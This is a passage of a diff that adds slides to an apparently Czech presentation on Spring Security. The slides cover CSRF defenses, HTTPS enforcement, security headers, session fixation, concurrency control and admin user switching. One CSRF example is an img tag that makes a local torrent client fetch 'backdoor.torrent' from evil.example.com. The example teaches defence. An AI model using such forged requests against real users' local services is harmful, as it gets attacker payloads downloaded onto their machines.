+                        <pre><code><img src="http://localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent"></code></pre>
+                        <p><em>HTTP GET method is easiest to hack, other methods require social engeneering or JavaScript to execute. But are not hard to do.</em></p>
+                    </section>
+                    <section data-transition="fade-in fade-out">
+                        <h1>CSRF protection</h1>
+                        <ul>
+                            <li>Referer header check (not entirely recommended)</li>
+                            <li>requesting unique CSRF token in HTTP request (as parameter or header, not cookie!)</li>
+                        </ul>
+                        <p><em style="font-size: 75%">Originally Spring Security used <a href="https://spring.io/blog/2013/08/21/spring-security-3-2-0-rc1-highlights-csrf-protection/">CSRF token per session</a>
+                           but it was quite impractical (browser back button, partial update) and thus CSRF token is now unique to session.</em></p>
+                        <h3>Things to consider</h3>
+                        <ul>
+                            <li>CSRF protection needs to be part of login & logout process</li>
+                            <li>Javascript / AJAX calls might copy contents <code>X-XSRF-TOKEN</code> to HTTP header (attacker won't be able to do this due to <em>same origin policy</em>) ... see
+                                <a href="http://docs.spring.io/spring-security/site/docs/4.2.x-SNAPSHOT/reference/html/csrf.html#csrf-cookie">CookieCsrfTokenRepository</a></li>
+                            <li>Multipart form posts are harder to protect - entire body must be processed before CSRF protection might apply</li>
+                            <li>CSRF token SHOULD NOT be used in GET requests due to possible token leak via Referer header. CSRF token should be used only in HTTP POST actions that produces protected side effect.</li>
+                        </ul>
+                    </section>
+                </section>
+                <!-- CHANNEL SECURITY -->
+                <section data-background="img/backgrounds/brown.jpg">
+                    <h1>Channel security</h1>
+                    <img class="plain" src="img/spring-security/ssl.png" alt="Password" style="width: 25%; float: left">
+                    <div style="text-align: left; float: left; margin-left: 2em; width: 65%; font-size: 80%;">
+                        <p>Allows you setup simple rules for SSL / plain HTTP protocol enforcement.</p>
+<pre style="display: inline-block;"><code class="xml" data-trim><http>
+    <intercept-url pattern="/secure/**" requires-channel="https"></intercept-url>
+    <intercept-url pattern="/css/**" requires-channel="http"></intercept-url>
+    <intercept-url pattern="/**" requires-channel="any"></intercept-url>
+    <port-mappings>
+        <port-mapping http="9080" https="9443"></port-mapping>
+    </port-mappings>
+</http></code></pre>
+                        <div style="text-align: center">
+                            <p>You don't have any excuse not to encrypt.</p>
+                            <a href="https://letsencrypt.org/">
+                                <img class="plain" src="img/spring-security/lets-encrypt.png" alt="Let's Encrypt" style="width: 50%">
+                            </a>
+                        </div>
+                    </div>
+                </section>
+                <!-- SECURITY HEADERS -->
+                <section data-background="img/spring-security/security_header.jpg" data-background-color="black" data-background-size="30%" data-background-position="left">
+                    <section data-transition="fade-in fade-out">
+                        <h1>Security headers</h1>
+                        <div style="text-align: left; margin-left: 8em;">
+                            <p>These are defaults:</p>
+<pre style="display: inline-block;"><code class="xml" data-trim>
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+Pragma: no-cache
+Expires: 0
+X-Content-Type-Options: nosniff
+Strict-Transport-Security: max-age=31536000 ; includeSubDomains
+X-Frame-Options: DENY
+X-XSS-Protection: 1; mode=block</code></pre>
+                            <p>By only declaring:</p>
+<pre style="display: inline-block;"><code class="xml" data-trim><http>
+	<headers defaults-disable="false"></headers>
+</http></code></pre>
+                        </div>
+                    </section>
+                    <section data-transition="fade-in fade-out">
+                        <h1>X-Content-Type-Options</h1>
+                        <div style="text-align: left; margin-left: 8em;">
+                            <p>Header example:</p>
+                            <pre style="display: inline-block;"><code class="xml" data-trim>X-Content-Type-Options: nosniff</code></pre>
+                            <p>Tells browsers (Chrome,IE) not to guess content type of the document from it's content.</p>
+                            <p>Attack scenario: malicious user uploads PDF file that contains JavaScript. Your server
+                               let other users to download such file and open it in their browser. Even if server supplies
+                               PDF content type, browser might decide not to trust it and detect content type by the contents of the
+                               file. Finally it handles PDF file as JavaScript one and executes the script.</p>
+                        </div>
+                    </section>
+                    <section data-transition="fade-in fade-out">
+                        <h1>HTTP Strict Transport Security (HSTS)</h1>
+                        <div style="text-align: left; margin-left: 8em;">
+                            <p>Header example:</p>
+                            <pre style="display: inline-block;"><code class="xml" data-trim>Strict-Transport-Security: max-age=31536000 ; includeSubDomains</code></pre>
+                            <p>Tells browser that all resources on this domain must be reached by HTTPS protocol.</p>
+                            <p>Except first request all subsequent ones will be loaded over HTTPS by the browser. Even if there is explicit link with HTTP protocol.</p>
+                            <pre style="display: inline-block;"><code class="xml" data-trim><img src="http://myserver.cz/img/someimage.jpg"></code></pre>
+                            <p>First request problem can be solved with <a href="https://hstspreload.appspot.com/">HSTS Preload</a></p>
+                        </div>
+                    </section>
+                    <section data-transition="fade-in fade-out">
+                        <h1>HTTP Public Key Pinning (HPKP)</h1>
+                        <div style="text-align: left; margin-left: 8em;">
+                            <p>Header example:</p>
+                            <pre style="display: inline-block;"><code class="xml" data-trim>Public-Key-Pins-Report-Only: max-age=5184000;
+                             pin-sha256="d6qzRu9zOECb90Uez27xWltNsj0e1Md7GkYYkVoZWmM=";
+                             pin-sha256="E9CZ9INDbd+2eRQozYqqbQ2yXLVKB9+xcprMF+44U1g=";
+                             report-uri="http://example.net/pkp-report";
+                             includeSubDomains</code></pre>
+                            <p>Tells browser that public key in the server certificate must match any of presented SHA256 hashes. Protects you against compromised CA.</p>
+                            <p>Trust on First Use.</p>
+                            <p>When using <code style="font-size: 80%">Public-Key-Pins</code> and the server delivers an unknown public key, the client should present a warning to the user.</p>
+                            <p>Reports can be processed with <a href="https://report-uri.io/">Report URI service</a></p>
+                        </div>
+                    </section>
+                    <section data-transition="fade-in fade-out">
+                        <h1>X-Frame-Options</h1>
+                        <div style="text-align: left; margin-left: 8em;">
+                            <p>Header example:</p>
+                            <pre style="display: inline-block;"><code class="xml" data-trim>X-Frame-Options: deny</code></pre>
+                            <p>Tells browser not to load any FRAMES on your domain (or only frames targeting your/some domain).</p>
+                            <p>Standardized as part of Content Security Policy.</p>
+                            <p>Alternative variants:</p>
+                            <pre style="display: inline-block;"><code class="xml" data-trim>X-Frame-Options: deny
+X-Frame-Options: sameorigin
+X-Frame-Options: allow-from www.seznam.cz</code></pre>
+                        </div>
+                    </section>
+                    <section data-transition="fade-in fade-out">
+                        <h1>X-XSS-Protection</h1>
+                        <div style="text-align: left; margin-left: 8em;">
+                            <p>Header example:</p>
+                            <pre style="display: inline-block;"><code class="xml" data-trim>X-XSS-Protection: 1; mode=block</code></pre>
+                            <p>Ask browser to assist you with reflected XSS attack.</p>
+                            <p>If browser <a href="https://blogs.msdn.microsoft.com/ie/2008/07/02/ie8-security-part-iv-the-xss-filter/">detects suspicious script</a> in request that is reflected in the server response, script is blocked or reported.</p>
+                            <p>Alternative variant:</p>
+                            <pre style="display: inline-block;"><code class="xml" data-trim>X-XSS-Protection: 1;  report=https://report-uri.io/</code></pre>
+                        </div>
+                    </section>
+                    <section data-transition="fade-in fade-out">
+                        <h1>Content Security Policy (CSP)</h1>
+                        <div style="text-align: left; margin-left: 8em; height: 800px;">
+                            <p>Header example:</p>
+                            <pre style="display: inline-block;"><code class="xml" data-trim>Content-Security-Policy: script-src 'self' https://trustedscripts.example.com;
+                         report-uri /csp-report-endpoint/</code></pre>
+                            <p>Site tels browser from which sources it expects to load resources.</p>
+                            <p>Documentation at <a href="https://content-security-policy.com/">https://content-security-policy.com</a></p>
+                            <p>Alternative variant:</p>
+                            <pre style="display: inline-block;"><code class="xml" data-trim>Content-Security-Policy-Report-Only: script-src 'self';
+                                     report-uri /csp-report-endpoint/</code></pre>
+                        </div>
+                    </section>
+                    <section data-transition="fade-in fade-out">
+                        <h1>Content Security Policy (CSP)</h1>
+                        <div style="text-align: left; margin-left: 8em; height: 800px;">
+                            <img src="img/spring-security/csp.png" alt="CSP overview">
+                        </div>
+                    </section>
+                </section>
+                <!-- SESSION MANAGMENT -->
+                <section data-background="img/backgrounds/binary-code.jpg">
+                    <section data-transition="fade-in fade-out">
+                        <h1>Session management</h1>
+                        <p>After successfull authentication all registered
+                            <a href="http://localhost:8091/?message=org/springframework/security/web/authentication/session/SessionAuthenticationStrategy.java">SessionAuthenticationStrategy</a>
+                            are called.<br/>Preprogrammed implementations provide:
+                        </p>
+                        <ul>
+                            <li>session fixation protection</li>
+                            <li>concurrency control</li>
+                        </ul>
+                    </section>
+                    <section data-transition="fade-in fade-out">
+                        <h1>Session fixation protection</h1>
+                        <p><strong>Attack vector:</strong> Attacker will create it's own session in the application.
+                            Via social engineering sends link to a user (or uses similar technique) that will make user
+                            browser to use already existing attacker session. When user logs in, attacker can act on
+                            behalf of the user.
+                        </p>
+                        <h3>Defense</h3>
+                        <div style="float: left; width: 45%; font-size: 80%; margin-left: 2em;">
+                            <p>Don't accept session id from URL by configuring web.xml:</p>
+                            <pre style="display: inline-block;"><code class="xml" data-trim><session-config>
+    <tracking-mode>COOKIE</tracking-mode>
+</session-config></code></pre>
+                            <ul style="font-size: 70%">
+                                <li>COOKIE</li>
+                                <li>URL</li>
+                                <li>
+                                    <a href="http://download.oracle.com/otn-pub/jcp/servlet-3.0-fr-eval-oth-JSpec/servlet-3_0-final-spec.pdf?AuthParam=1471606619_c6d486d96c4d3110d045d7027578a40e">SSL</a> (chapter 7.1.2)</li>
+                            </ul>
+                        </div>
+                        <div style="float: left; width: 45%; font-size: 80%; margin-left: 2em;">
+                            <p>Create new session on user login:</p>
+                            <pre style="display: inline-block;"><code class="xml" data-trim>&lt;session-management session-fixation-protection="migrateSession"/&gt;</code></pre>
+                            <ul style="font-size: 70%">
+                                <li>newSession (clean)</li>
+                                <li>migrateSession (copy)</li>
+                                <li>changeSessionId (Servlet 3.1)</li>
+                            </ul>
+                        </div>
+                    </section>
+                    <section data-transition="fade-in fade-out">
+                        <h1>Concurrency control</h1>
+                        <p>Spring Security can track all sessions in <a href="http://localhost:8091/?message=org/springframework/security/core/session/SessionRegistry.java">SessionRegistry</a>.</p>
+                        <pre style="display: inline-block;"><code class="xml" data-trim><session-management>
+    &lt;concurrency-control max-sessions="1" error-if-maximum-exceeded="true"/&gt;  expired-url="/sessionExpired.html"
+</session-management></code></pre>
+                        <p>When <em>error-if-maximum-exceeded</em> is false and <em>max-sessions</em> is exceeded least recently used session is invalidated.
+                           User using this session will get <em>expired-url</em> page.</p>
+                    </section>
+                </section>
+                <!-- USER SWITCHING -->
+                <section data-background="img/backgrounds/brown.jpg">
+                    <h1>User switching</h1>
+                    <img src="img/spring-security/user-switch.png" alt="CSP overview" class="plain" width="200" style="float: left;">
+                    <div style="float: left; margin-left: 2em; width: 65%; font-size: 80%;">
+                        <p>Handy for developers as well as for customer administrators. Allows user with admin roles to switch
+                           to any other user with lower roles without knowing password.</p>
+<pre style="display: inline-block;"><code class="java" data-trim>@Override
+protected void configure(HttpSecurity http) throws Exception {
+    final SwitchUserFilter filter = new SwitchUserFilter();
+    filter.setSwitchUserUrl("/switchUser");
+    filter.setUsernameParameter("username");
+    filter.setExitUserUrl("/restoreUserBack");
+    http.addFilterAfter(filter, FilterSecurityInterceptor.class)
+        .authorizeRequests()
+            .antMatchers("/switchUser").hasAnyAuthority("ROLE_ADMIN")
+            .antMatchers("/restoreUser").authenticated();
+}</code></pre>
+                        <p>Consider also adding an IP check or other authentication checks to better secure user switching.<br/>This feature is form of backdoor.</p>
+                    </div>
+                </section>
+                <!-- OUTRO -->
                 <section data-background="img/spring-security/questions.jpg">
                     <h2 style="margin-top: 8em">Děkuji za pozornost</h2>
                     <p>Contact me at <a href="https://www.twitter.com/novoj">@Novoj</a> or <a href="mailto:novotnaci@gmail.com">novotnaci@gmail.com</a></p>
                 </section>
 			</div>
 
-            <!-- TO STUDY: http://stackoverflow.com/questions/549/the-definitive-guide-to-form-based-website-authentication -->
+            <!-- REFERENCE: http://stackoverflow.com/questions/549/the-definitive-guide-to-form-based-website-authentication -->
 
 		</div>
 
